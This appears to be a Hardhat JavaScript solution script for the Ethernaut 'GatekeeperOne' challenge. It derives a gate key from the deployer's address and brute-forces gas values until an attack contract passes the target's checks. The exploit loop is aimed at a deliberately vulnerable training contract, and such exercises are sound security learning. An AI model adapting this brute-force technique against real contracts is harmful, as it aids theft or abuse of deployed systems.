const { ethers, getNamedAccounts } = require("hardhat")

async function main() {
    const accounts = await ethers.getSigners()
    // const player = accounts[1]
    const deployer = accounts[0]

    const gatekeeperOneAttack = await ethers.getContract("GatekeeperOneAttack")

    const uint16TxOrigin = deployer.address.slice(-4)
    const gateKey = `0x100000000000${uint16TxOrigin}`

    console.log(`GateKey: ${gateKey}`)

    const MOD = 8191
    let gasToUse = 800000
    for (i = 0; i < MOD; i++) {
        gasToUse = gasToUse + i
        try {
            console.log(`Testing with ${gasToUse} gas`)
            const tx = await gatekeeperOneAttack.attack(gateKey, gasToUse, { gasLimit: `950000` })
            console.log(`Exploited with ${gasToUse} gas and ${gateKey} as the GateKey`)
            break
        } catch (e) {}
    }
}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error)
        process.exit(1)
    })
